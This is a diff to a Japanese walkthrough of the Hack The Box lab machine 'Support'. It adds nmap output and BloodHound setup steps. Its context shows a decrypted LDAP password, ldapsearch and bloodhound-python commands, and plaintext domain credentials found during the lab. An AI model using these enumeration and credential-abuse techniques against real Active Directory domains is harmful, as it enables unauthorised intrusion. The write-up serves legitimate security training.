@@ -1,4 +1,32 @@
-まずsmbシェアを調べると、見慣れないsupport-toolsなフォルダがある。
+```
+┌──(shoebill㉿shoebill)-[~/Support_10.10.11.174]
+└─$ nmap -vv --reason -Pn -T4 -sV -sC --version-all -A --osscan-guess -p- 10.10.11.174
+...
+Nmap scan report for 10.10.11.174
+Host is up, received user-set (0.076s latency).
+Scanned at 2022-10-04 12:59:22 JST for 402s
+Not shown: 65516 filtered tcp ports (no-response)
+PORT      STATE SERVICE       REASON          VERSION
+53/tcp    open  domain        syn-ack ttl 127 Simple DNS Plus
+88/tcp    open  kerberos-sec  syn-ack ttl 127 Microsoft Windows Kerberos (server time: 2022-10-04 03:59:21Z)
+135/tcp   open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
+139/tcp   open  netbios-ssn   syn-ack ttl 127 Microsoft Windows netbios-ssn
+389/tcp   open  ldap          syn-ack ttl 127 Microsoft Windows Active Directory LDAP (Domain: support.htb0., Site: Default-First-Site-Name)
+445/tcp   open  microsoft-ds? syn-ack ttl 127
+464/tcp   open  kpasswd5?     syn-ack ttl 127
+593/tcp   open  ncacn_http    syn-ack ttl 127 Microsoft Windows RPC over HTTP 1.0
+636/tcp   open  tcpwrapped    syn-ack ttl 127
+3268/tcp  open  ldap          syn-ack ttl 127 Microsoft Windows Active Directory LDAP (Domain: support.htb0., Site: Default-First-Site-Name)
+3269/tcp  open  tcpwrapped    syn-ack ttl 127
+5985/tcp  open  http          syn-ack ttl 127 Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
+|_http-server-header: Microsoft-HTTPAPI/2.0
+|_http-title: Not Found
+9389/tcp  open  mc-nmf        syn-ack ttl 127 .NET Message Framing
+...
+```
+nmapの結果よりターゲット上でActive Directoryが動いてるとわかる。
+
+ポート445が開いてるのでsmbシェアを調べると、見慣れないsupport-toolsなるフォルダがある。
 
 ```
 ┌──(shoebill㉿shoebill)-[~/Support_10.10.11.174]
@@ -73,8 +101,6 @@ print('ans:', ans)
 └─$ python3 decryptor.py
 ans: b'nvEfEK16^1aM4$e7AclUf8x$tRWxPWO1%lmz'
 ```
-しかし、このパスワードはユーザsupportのパスワードではない。
-
 もう少しdnSpyの解析結果をみると、`LdapQuery()`というLdapについての関数が見つかる。
 
 ![ldapq](https://user-images.githubusercontent.com/85237728/194679714-8b0abf6c-6c51-40f4-8785-4845d4691776.png)
@@ -83,7 +109,7 @@ ans: b'nvEfEK16^1aM4$e7AclUf8x$tRWxPWO1%lmz'
 
 ユーザ名ldap、パスワードnvEfEK16^1aM4$e7AclUf8x$tRWxPWO1%lmzのcredentialを使って`ldapsearch`コマンドを実行する。
 
-以下のように実行してUser情報を調べると、ユーザsupportの「info」の欄にパスワードらしき文字列がある。
+以下のように実行してUser情報を調べると、ユーザsupportの「info」の欄にパスワードらしき文字列を発見。
 
 ```
 ┌──(shoebill㉿shoebill)-[~/Support_10.10.11.174/LdapSearch]
@@ -128,6 +154,25 @@ bloodhoundを使う。
 ┌──(shoebill㉿shoebill)-[~/Support_10.10.11.174]
 └─$ bloodhound-python -u support -p 'Ironside47pleasure40Watchful' -ns 10.10.11.174 -d support.htb -c all
 ```
+
+上記コマンドにより20221009195127_XXXX.jsonという形式のjsonファイルが得られる。
+
+bloodhoundを起動するため次を実行する。
+
+```
+┌──(shoebill㉿shoebill)-[~/Support_10.10.11.174]
+└─$ sudo neo4j console
+...
+```
+
+新規ターミナルで次を実行。
+
+```
+┌──(shoebill㉿shoebill)-[~/Support_10.10.11.174]
+└─$ bloodhound
+```
+
+bloodhoundの画面が立ち上がったら、ドラッグ＆ドロップで先に得られた20221009195127_XXXX.json形式のjsonファイルたちをアップロードする。
 
 すると、ユーザsupportが属しているShared Support Accountsグループは、dc.suuport.htbに対してGenericAllであることがわかる。
 
